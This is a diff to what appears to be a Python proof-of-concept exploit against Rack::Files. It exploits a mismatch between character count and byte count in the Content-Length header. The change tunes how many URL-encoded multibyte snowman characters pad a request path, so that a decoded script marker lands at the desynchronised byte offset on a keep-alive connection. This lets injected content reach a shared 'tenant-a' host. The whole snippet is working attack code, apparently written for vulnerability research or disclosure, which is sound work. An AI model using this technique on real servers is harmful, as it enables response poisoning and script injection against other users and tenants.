@@ -94,7 +94,12 @@ def main() -> int:
                 if os.environ.get("RACK_THIN_IMPACT") == "1"
                 else "A_CONTROLLED_MARKER"
             )
-            path = "/missing/" + "%E2%98%83" * 80 + suffix
+            # Rack::Files uses character count for Content-Length. With this
+            # prefix length, the decoded script marker starts exactly at the
+            # byte offset advertised by Content-Length, so it is the first
+            # delayed byte rather than being buried at the end of the tail.
+            snowmen = 18 if os.environ.get("RACK_THIN_IMPACT") == "1" else 80
+            path = "/missing/" + "%E2%98%83" * snowmen + suffix
             direct_request = (
                 f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
                 "Connection: keep-alive\r\n\r\n"
